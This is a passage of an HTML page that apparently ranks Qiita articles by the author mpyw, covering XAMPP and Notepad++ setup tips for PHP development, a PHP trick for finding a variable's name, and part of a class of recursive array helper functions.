<span id="windows標準のメモ帳を使っている" class="fragment"></span><a href="#windows%E6%A8%99%E6%BA%96%E3%81%AE%E3%83%A1%E3%83%A2%E5%B8%B3%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6%E3%81%84%E3%82%8B"><i class="fa fa-link"></i></a>Windows標準のメモ帳を使っている</h2>

<p><del>そんな糞ソフトウェアはゴミ箱に捨ててしまいましょう。</del>というのは言いすぎですが、それをPHPプログラミングに用いるのはやめましょう。さまざまなデメリットを抱えており、PHPに限らず<ins>プログラミングと非常に相性が悪い</ins>です。以下に私がオススメする <strong>Notepad++</strong> の導入手順を示します。</p>

<p><strong>Notepad++</strong><br>
<a href="http://sourceforge.jp/projects/notepad-plus/" class="autolink" rel="nofollow noopener" target="_blank">http://sourceforge.jp/projects/notepad-plus/</a></p>

<ol>
<li>上記サイトからダウンロードしてインストールを実行。</li>
<li>「設定」→「環境設定」→「新規作成」を開く。</li>
<li>フォーマットで <strong>「Unix」</strong> を選択、エンコードで <strong>「UTF-8(BOM無し)」</strong> を選択して <strong>「開いているANSIファイルに適用」</strong> にチェック、デフォルトの言語で「PHP」を選択。</li>
<li>「設定」→「環境設定」→「ファイルの関連付け」を開く。</li>
<li>「.html」「.xhtml」「.css」「.js」「.php」などを登録しておく。</li>
<li>「設定」→「環境設定」→「タブ設定」を開く。</li>
<li>タブサイズで「4」を指定する。タブ文字よりも半角スペース複数個の方が好みであれば「半角スペースで置換」にチェックを入れる。</li>
</ol>

<p>常に編集は<br>
<a href="https://camo.qiitausercontent.com/ca2fe3f31020f8a0662d100018867142d9070219/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f64383038333232322d643938382d366464362d653863302d3861353333636361373435642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/ca2fe3f31020f8a0662d100018867142d9070219/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f64383038333232322d643938382d366464362d653863302d3861353333636361373435642e706e67" alt="ss (2013-11-25 at 01.34.36).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/d8083222-d988-6dd6-e8c0-8a533cca745d.png"></a><br>
この状態で行ってください。</p>

<h3>
<span id="notepadのちょっとしたtips" class="fragment"></span><a href="#notepad%E3%81%AE%E3%81%A1%E3%82%87%E3%81%A3%E3%81%A8%E3%81%97%E3%81%9Ftips"><i class="fa fa-link"></i></a>Notepad++のちょっとしたTips</h3>

<ul>
<li>
<strong>まとめてインデント</strong><br>→ 複数行選択して <code>Tab</code> を押す。</li>
<li>
<strong>まとめてアンインデント</strong><br>→ 複数行選択して <code>Shift</code> <code>Tab</code> を押す。</li>
</ul>

<p>基本的な設定は以上で完了です。なお、php.iniはメモ帳で編集しても<ins>改行コードがCRLFで日本語が登場しない</ins>ので問題が発生しないようになっています。しかし、わざわざメモ帳を使う必要はないのでこれからは<del>メモ帳さんには永眠していただきましょう</del>。</p>

<h1>
<span id="よくある質問" class="fragment"></span><a href="#%E3%82%88%E3%81%8F%E3%81%82%E3%82%8B%E8%B3%AA%E5%95%8F"><i class="fa fa-link"></i></a>よくある質問</h1>

<h2>
<span id="apacheが起動しない" class="fragment"></span><a href="#apache%E3%81%8C%E8%B5%B7%E5%8B%95%E3%81%97%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>Apacheが起動しない！</h2>

<p>大部分の問題はポート(HTTP用の) <strong>80番</strong> と (HTTPS用の) <strong>443番</strong> が他のプロセスに使用されていることに起因します。代表的なケースとして<ins>Skypeとの競合</ins>があります。</p>

<h4>
<span id="skypeの場合の解決策" class="fragment"></span><a href="#skype%E3%81%AE%E5%A0%B4%E5%90%88%E3%81%AE%E8%A7%A3%E6%B1%BA%E7%AD%96"><i class="fa fa-link"></i></a>Skypeの場合の解決策</h4>

<ol>
<li>ツール→設定→詳細→接続</li>
<li>
<ins>「上記ポートに代わり、ポート80と443を使用」</ins>のチェックを外す</li>
</ol>

<p><a href="https://camo.qiitausercontent.com/3a8b8eeaa97711b9ce2ef27527acfbbe695af5ed/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f65353062313639362d336666302d363833312d346164642d3533323231646339646635382e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/3a8b8eeaa97711b9ce2ef27527acfbbe695af5ed/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f65353062313639362d336666302d363833312d346164642d3533323231646339646635382e706e67" alt="ss (2013-11-25 at 06.06.05).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/e50b1696-3ff0-6831-4add-53221dc9df58.png"></a></p>

<p>他のケースでも、とりあえずApacheにこれらのポートを譲ってあげれば、たいていの問題は解決するはず。</p>

<h2>
<span id="cxampphtdocs-からドキュメントルートを他の場所に変えたいんだけど" class="fragment"></span><a href="#cxampphtdocs-%E3%81%8B%E3%82%89%E3%83%89%E3%82%AD%E3%83%A5%E3%83%A1%E3%83%B3%E3%83%88%E3%83%AB%E3%83%BC%E3%83%88%E3%82%92%E4%BB%96%E3%81%AE%E5%A0%B4%E6%89%80%E3%81%AB%E5%A4%89%E3%81%88%E3%81%9F%E3%81%84%E3%82%93%E3%81%A0%E3%81%91%E3%81%A9"><i class="fa fa-link"></i></a><code>C:\xampp\htdocs</code> からドキュメントルートを他の場所に変えたいんだけど？</h2>

<p>これにはいくつか方法がありますが、一番問題を引き起こす可能性の低いものとしては <strong>シンボリックリンク</strong> を張る方法が挙げられるでしょう。Linuxユーザーであれば馴染み深いものであると思います。</p>

<h4>
<span id="windowsでの例" class="fragment"></span><a href="#windows%E3%81%A7%E3%81%AE%E4%BE%8B"><i class="fa fa-link"></i></a>Windowsでの例</h4>

<ol>
<li>コマンドプロンプトを起動。</li>
<li>
<code>mklink /D "D:\Dropbox\web" "C:\xampp\htdocs"</code> を実行。</li>
<li>
<code>D:\Dropbox\web</code> が作成され、ここをhtdocsと全く同じものとして扱うことが出来るようになる。</li>
</ol>

<p>参考 <a href="http://phpjavascriptroom.com/?t=topic&amp;p=windows7" class="autolink" rel="nofollow noopener" target="_blank">http://phpjavascriptroom.com/?t=topic&amp;p=windows7</a></p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />50位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>18</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/43e7d2e17f1c4507b363">変数名自体を取得する</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-08-08 11:49:11</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>初心者の頃何故かこういうことやりたがってたなぁ・・・<br>
絶対実用アプリケーション開発でやっちゃだめよ！！！<br>
変数シンボルの管理ぐらいプログラマの脳ミソでやるべきであって、プログラムにやらせるべきじゃない。</p>

<p>ちなみにグローバルスコープ限定という悲惨な縛りつき。<br>
既にその変数が他の変数とリファレンス状態であったときもどっちの名前が返るか分からない。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="k">function</span> <span class="nf">get_var_name</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$var</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$var</span><span class="p">;</span>
    <span class="nv">$var</span> <span class="o">=</span> <span class="nb">openssl_random_pseudo_bytes</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
    <span class="nv">$name</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$GLOBALS</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$v</span> <span class="o">===</span> <span class="nv">$var</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$k</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nv">$var</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span>
    <span class="k">return</span> <span class="nv">$name</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$hoge</span> <span class="o">=</span> <span class="s1">'foo'</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nx">get_var_name</span><span class="p">(</span><span class="nv">$hoge</span><span class="p">));</span> <span class="c1">// string(4) "hoge"</span>
</pre></div></div>

<p><strong>追記: <code>get_defined_vars</code>で得る値を渡すことを要求すれば任意のスコープに対応できます。</strong></p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">改良版</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="k">function</span> <span class="nf">get_var_name</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$var</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$scope</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$var</span><span class="p">;</span>
    <span class="nv">$var</span> <span class="o">=</span> <span class="nb">openssl_random_pseudo_bytes</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
    <span class="nv">$name</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$scope</span> <span class="o">===</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$scope</span> <span class="o">=</span> <span class="nv">$GLOBALS</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$scope</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$v</span> <span class="o">===</span> <span class="nv">$var</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$k</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nv">$var</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span>
    <span class="k">return</span> <span class="nv">$name</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$hoge</span> <span class="o">=</span> <span class="s1">'foo'</span><span class="p">;</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nx">get_var_name</span><span class="p">(</span><span class="nv">$hoge</span><span class="p">));</span> <span class="c1">// string(4) "hoge"</span>

<span class="nb">call_user_func</span><span class="p">(</span><span class="k">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="nv">$fuga</span> <span class="o">=</span> <span class="s1">'foo'</span><span class="p">;</span>
    <span class="nb">var_dump</span><span class="p">(</span><span class="nx">get_var_name</span><span class="p">(</span><span class="nv">$fuga</span><span class="p">,</span> <span class="nb">get_defined_vars</span><span class="p">()));</span> <span class="c1">// string(4) "fuga"</span>
<span class="p">});</span>
</pre></div>
</div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />51位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>16</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/f7ea05414934162440fa">配列を再帰的に処理する関数いろいろ</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-09-08 02:59:21</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>関数というか静的メソッドですけど。</p>

<p>PHP5以降であれば多分動くと思います。<br>
5.3未満のためにクロージャは消しました。<br>
また、ソート関数に関してはソートフラグを設定するとNoticeが発生するリスクがあるのでオプション無しという方針で書きました。<br>
デバッグ不足だと思うのでバグを見つけられた方は是非報告を。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">interface</span> <span class="nx">RecursiveArrayInterface</span> <span class="p">{</span>

    <span class="cm">/* 各ソート関数再帰対応版。オプション無し。 */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">sort</span><span class="p">(</span><span class="k">array</span> <span class="o">&amp;</span><span class="nv">$arr</span><span class="p">);</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">rsort</span><span class="p">(</span><span class="k">array</span> <span class="o">&amp;</span><span class="nv">$arr</span><span class="p">);</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">asort</span><span class="p">(</span><span class="k">array</span> <span class="o">&amp;</span><span class="nv">$arr</span><span class="p">);</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">arsort</span><span class="p">(</span><span class="k">array</span> <span class="o">&amp;</span><span class="nv">$arr</span><span class="p">);</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">ksort</span><span class="p">(</span><span class="k">array</span> <span class="o">&amp;</span><span class="nv">$arr</span><span class="p">);</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">krsort</span><span class="p">(</span><span class="k">array</span> <span class="o">&amp;</span><span class="nv">$arr</span><span class="p">);</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">natsort</span><span class="p">(</span><span class="k">array</span> <span class="o">&amp;</span><span class="nv">$arr</span><span class="p">);</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">natcasesort</span><span class="p">(</span><span class="k">array</span> <span class="o">&amp;</span><span class="nv">$arr</span><span class="p">);</span>

    <span class="cm">/* shuffle()再帰対応版。$preserve_keysをTrueにするとキーが保持される。 */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">shuffle</span><span class="p">(</span><span class="k">array</span> <span class="o">&amp;</span><span class="nv">$arr</span><span class="p">,</span> <span class="nv">$preserve_keys</span> <span class="o">=</span> <span class="k">false</span><span class="p">);</span>

    <span class="cm">/* array_change_key_case()再帰対応版。 */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">changeKeyCase</span><span class="p">(</span><span class="k">array</span> <span class="nv">$arr</span><span class="p">,</span> <span class="nv">$case</span> <span class="o">=</span> <span class="nx">CASE_LOWER</span><span class="p">);</span>

    <span class="cm">/* array_combine()再帰対応版。元の関数と違い、$keyと$valuesで構造が違う場合もエラーを発生しない。 */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">combine</span><span class="p">(</span><span class="k">array</span> <span class="nv">$keys</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$values</span><span class="p">);</span>

    <span class="cm">/* array_values()再帰対応版。 */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">values</span><span class="p">(</span><span class="k">array</span> <span class="nv">$arr</span><span class="p">);</span>

    <span class="cm">/* array_reverse()再帰対応版。 「数値キーの場合のみ...」とかややこしいので</span>
<span class="cm">       $preserve_keysの効力を絶対的にした。 */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">reverse</span><span class="p">(</span><span class="k">array</span> <span class="nv">$arr</span><span class="p">,</span> <span class="nv">$preserve_keys</span> <span class="o">=</span> <span class="k">false</span><span class="p">);</span>

    <span class="cm">/* array_filter()再帰対応版。元の関数と違い、デフォルトではキーは振り直される。</span>
<span class="cm">       $preserve_keysをTrueにするとキーが保持される。*/</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="k">array</span> <span class="nv">$arr</span><span class="p">,</span> <span class="nv">$callback</span> <span class="o">=</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$preserve_keys</span> <span class="o">=</span> <span class="k">false</span><span class="p">);</span>

    <span class="cm">/* array_map()再帰対応版。配列は1つしか受け付けない。 */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">map</span><span class="p">(</span><span class="nv">$callback</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$arr</span><span class="p">);</span>

    <span class="cm">/* 配列の葉要素のみを取り出して返す関数。$preserve_keysをTrueにするとキーが保持され、</span>
<span class="cm">       キーが重複した場合後から出現したものが優先される。 */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">flatten</span><span class="p">(</span><span class="k">array</span> <span class="nv">$arr</span><span class="p">,</span> <span class="nv">$preserve_keys</span> <span class="o">=</span> <span class="k">false</span><span class="p">);</span>

    <span class="cm">/* array_sum()再帰対応版。 */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">sum</span><span class="p">(</span><span class="k">array</span> <span class="nv">$arr</span><span class="p">);</span>

    <span class="cm">/* array_product()再帰対応版。 */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">product</span><span class="p">(</span><span class="k">array</span> <span class="nv">$arr</span><span class="p">);</span>

    <span class="cm">/* array_unique()再帰対応版。一般的なarray_unique_recursive()と異なり、子要素の中の</span>
<span class="cm">       キーや順番が異なるが値が重複している配列は等しいとみなされる。 $preserve_keysを</span>
<span class="cm">       Trueにするとキーが保持されるが、重複しているものがあった場合どのキーが使われるか</span>
<span class="cm">       は未定義とする。*/</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">unique</span><span class="p">(</span><span class="k">array</span> <span class="nv">$arr</span><span class="p">,</span> <span class="nv">$preserve_keys</span> <span class="o">=</span> <span class="k">false</span><span class="p">);</span>

<span class="p">}</span>

<span class="k">class</span> <span class="nc">RecursiveArray</span> <span class="k">implements</span> <span class="nx">RecursiveArrayInterface</span> <span class="p">{</span>

    <span class="k">private</span> <span class="k">static</span> <span class="nv">$tmp</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">sort</span><span class="p">(</span><span class="k">array</span> <span class="o">&amp;</span><span class="nv">$arr</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="o">&amp;</span><span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span> <span class="p">{</span>
                <span class="nx">self</span><span class="o">::</span><span class="na">sort</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nb">sort</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">rsort</span><span class="p">(</span><span class="k">array</span> <span class="o">&amp;</span><span class="nv">$arr</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="o">&amp;</span><span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span> <span class="p">{</span>
                <span class="nx">self</span><span class="o">::</span><span class="na">rsort</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nb">rsort</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">asort</span><span class="p">(</span><span class="k">array</span> <span class="o">&amp;</span><span class="nv">$arr</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="o">&amp;</span><span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span> <span class="p">{</span>
                <span class="nx">self</span><span class="o">::</span><span class="na">asort</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nb">asort</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">arsort</span><span class="p">(</span><span class="k">array</span> <span class="o">&amp;</span><span class="nv">$arr</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="o">&amp;</span><span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span> <span class="p">{</span>
                <span class="nx">self</span><span class="o">::</span><span class="na">arsort</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nb">arsort</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">ksort</span><span class="p">(</span><span class="k">array</span> <span class="o">&amp;</span><span class="nv">$arr</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="o">&amp;</span><span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span> <span class="p">{</span>
                <span class="nx">self</span><span class="o">::</span><span class="na">ksort</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nb">ksort</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">krsort</span><span class="p">(</span><span class="k">array</span> <span class="o">&amp;</span><span class="nv">$arr</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="o">&amp;</span><span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span> <span class="p">{</span>
                <span class="nx">self</span><span class="o">::</span><span class="na">krsort</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nb">krsort</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">natsort</span><span class="p">(</span><span class="k">array</span> <span class="o">&amp;</span><span class="nv">$arr</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="o">&amp;</span><span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span> <span class="p">{</span>
                <span class="nx">self</span><span class="o">::</span><span class="na">natsort</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nb">natsort</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">natcasesort</span><span class="p">(</span><span class="k">array</span> <span class="o">&amp;</span><span class="nv">$arr</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="o">&amp;</span><span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span> <span class="p">{</span>
                <span class="nx">self</span><span class="o">::</span><span class="na">natcasesort</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nb">natcasesort</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">shuffle</span><span class="p">(</span><span class="k">array</span> <span class="o">&amp;</span><span class="nv">$arr</span><span class="p">,</span> <span class="nv">$preserve_keys</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="o">&amp;</span><span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span> <span class="p">{</span>
                <span class="nx">self</span><span class="o">::</span><span class="na">shuffle</span><span class="p">(</span><span class="nv">$item</span><span class="p">,</span> <span class="nv">$preserve_keys</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$preserve_keys</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$keys</span> <span class="o">=</span> <span class="nb">array_keys</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span>
            <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">shuffle</span><span class="p">(</span><span class="nv">$keys</span><span class="p">);</span>
            <span class="nv">$new</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$keys</span> <span class="k">as</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$new</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$arr</span><span class="p">[</span><span class="nv">$key</span><span class="p">];</span>
            <span class="p">}</span>
            <span class="nv">$arr</span> <span class="o">=</span> <span class="nv">$new</span><span class="p">;</span>
            <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nb">shuffle</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">changeKeyCase</span><span class="p">(</span><span class="k">array</span> <span class="nv">$arr</span><span class="p">,</span> <span class="nv">$case</span> <span class="o">=</span> <span class="nx">CASE_LOWER</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$ret</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$case</span> <span class="o">===</span> <span class="nx">CASE_UPPER</span> <span class="o">?</span> <span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span> <span class="o">:</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$item</span> <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">changeKeyCase</span><span class="p">(</span><span class="nv">$item</span><span class="p">,</span> <span class="nv">$case</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="nv">$ret</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$item</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
    <span class="p">}</span>

